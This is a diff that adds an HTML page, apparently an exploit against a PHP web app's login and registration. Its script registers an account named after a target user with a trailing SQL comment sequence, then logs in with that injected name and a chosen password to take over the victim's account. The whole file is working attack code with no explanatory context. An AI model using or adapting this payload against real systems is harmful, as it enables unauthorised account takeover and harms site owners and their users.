@@ -1,0 +1,37 @@
+<!DOCTYPE html>
+<html>
+<script src="/assets/jquery/js/jquery-1.7.2.min.js"></script>
+<body>
+<form action='index.php' onsubmit='' method='POST'>
+	<input type='hidden' name='action' value='login'/>
+	<input type='hidden' name='login' value=''/>
+	<input type='hidden' name='pw' value='save'/>
+</form>
+
+<input name='login' id='targetlogin' value='username'>
+<button id='exploit' onclick='return test();'>Submit</button>
+
+<script>
+
+function test(){
+
+	var target = document.getElementById('targetlogin').value
+	var register = {'action': 'register', 'login': target + "'--", 'name': 'whocares', 'pw1': 'whocares', 'pw2': 'whocares' }
+	
+	$.ajax({
+		type: 'POST',
+		url: 'index.php',
+		data: register,
+		success: function(result) {alert('Done!')}
+	});
+
+	document.getElementsByName('login')[0].value = target + "'--"
+	
+	document.forms[0].submit()
+	
+}
+
+</script>
+
+</body>
+</html>
